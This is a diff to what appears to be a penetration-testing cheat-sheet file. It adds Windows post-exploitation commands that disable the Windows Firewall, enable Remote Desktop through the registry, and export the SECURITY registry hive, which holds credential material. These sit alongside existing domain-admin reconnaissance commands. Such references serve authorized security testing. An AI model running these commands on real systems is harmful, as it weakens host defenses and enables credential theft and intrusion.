@@ -98,6 +98,7 @@ Load({
 // ############### Networking ######################
 
 Load({payload: "ipconfig /all", desc: "Get all network interfaces", category: "Networking"})
+Load({payload: "ipconfig /displaydns", desc: "Get dns configuration", category: "Networking"})
 Load({payload: "netstat -r", desc: "Display routing table", category: "Networking"})
 Load({payload: "netstat -nabo", desc: "Lists ports / connections with corresponding process", category: "Networking"})
 Load({payload: "netstat -na | findstr :445", desc: "Find listening connections on specific port", category: "Networking"})
@@ -106,7 +107,7 @@ Load({payload: "net localgroup administrators", desc: "Prints local admins", cat
 Load({payload: "net group “Domain Admins” /domain", desc: "Prints list of Domain Admins", category: "Networking"})
 Load({payload: "net localgroup administrators /domain", desc: "Prints local admins", category: "Networking"})
 Load({payload: "net group “Domain Controllers” /domain", desc: "Prints the list of Domain Controllers for the current domain", category: "Networking"})
-
+Load({payload: "netsh firewall set opmode disable", desc: "Disable Windows Firewall", category: "Networking"})
 
 // ################### WMIC ######################
 
@@ -134,6 +135,19 @@ Load({
 })
 
 
+// ############### Windows Registry ######################
+
+Load({
+	title: "Enable Remote Desktop",
+	payload: "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f",  
+	category: "Windows Registry"
+})
+
+Load({
+	title: "Export Windows Security Hive",
+	payload: "reg SAVE HKLM\\SECURITY security.hive",  
+	category: "Windows Registry"
+})
 
 // ############## End of Payloads ##############
 
